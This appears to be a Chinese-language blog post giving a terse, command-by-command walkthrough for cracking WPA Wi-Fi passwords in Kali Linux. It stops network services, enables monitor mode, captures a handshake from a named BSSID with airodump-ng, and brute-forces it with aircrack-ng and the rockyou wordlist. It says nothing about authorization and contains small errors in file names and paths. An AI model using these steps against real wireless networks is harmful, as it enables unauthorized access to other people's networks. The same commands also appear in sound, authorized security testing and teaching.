---
layout: post
title:  kali_Linux下无线渗透
categories: [Linux]
tags: [Linux]
---

kali_Linux下无线渗透
<!--more-->

- 加载无线网卡进kali
  - 通过iwconfig查看是否加载

- 关闭可影响的进程
  - service network-manager stop
  - airmon-ng check kill

- 启动网卡监听模式

    - airmon-ng start wlan0


    - 确认已开启  iwconfig
- 抓包
	- airodump-ng wlan0mon
	- airodump-ng wlan0mon --bssid C8:3A:35:49:02:98 -c 4 -w wpa

- ls wpa* 查看抓取的包 .cap文件，记住最新的
	- 后面使用Kali Linux中默认存在的字典，目录为/usr/share/wordlists/rockyou.txt.zip，其中需要使用命令来解压：
gunzip ruckyou.txt.gz
这里顺便记录一下Kali中几个常用的字典文件的位置：
/usr/share/john/password.lst
/usr/share/wfuzz/wordlist
/usr/share/ wordlists

- 破解

   - aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa-04.cap进行破解：
